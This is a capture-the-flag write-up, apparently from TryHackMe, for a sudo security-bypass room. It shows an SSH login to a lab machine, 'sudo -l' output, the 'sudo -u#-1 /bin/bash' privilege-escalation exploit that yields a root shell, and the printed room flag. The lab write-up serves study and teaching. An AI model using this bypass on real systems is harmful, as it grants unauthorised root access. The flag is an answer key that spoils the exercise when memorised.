---
custom_edit_url: null
---


## Task 1: Deploy!
### Deployed!
### No answer needed

&nbsp;

## Task 2: Security Bypass
### What command are you allowed to run with sudo?

Let's first connect to the machine using `ssh` and the following credentials:

```
┌──(kunal㉿kali)-[~]
└─$ ssh tryhackme@10.10.150.83 -p 2222
The authenticity of host '[10.10.150.83]:2222 ([10.10.150.83]:2222)' can't be established.
ED25519 key fingerprint is SHA256:4bgDOPxI7PFcv5CMfQYEkO7uBqKjLKhd7zZwmE8uwbQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.150.83]:2222' (ED25519) to the list of known hosts.
tryhackme@10.10.150.83's password: 
Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
tryhackme@sudo-privesc:~$ 
```

Now, we can list out the command we are allowed to run as `sudo`.

```
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
```
### Answer
```
/bin/bash
```

&nbsp;

### What is the flag in /root/root.txt?
We can find the exploit on the following page.

![1](https://github.com/Knign/Write-ups/assets/110326359/b3e3ece3-ea74-42c3-aefa-800116a4748f)

```
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# 
```

We can now read the flag in `/root/root.txt`.
```
root@sudo-privesc:~# cat /root/root.txt 
THM{l33t_s3cur1ty_bypass}
```
### Answer
```
THM{l33t_s3cur1ty_bypass}
```
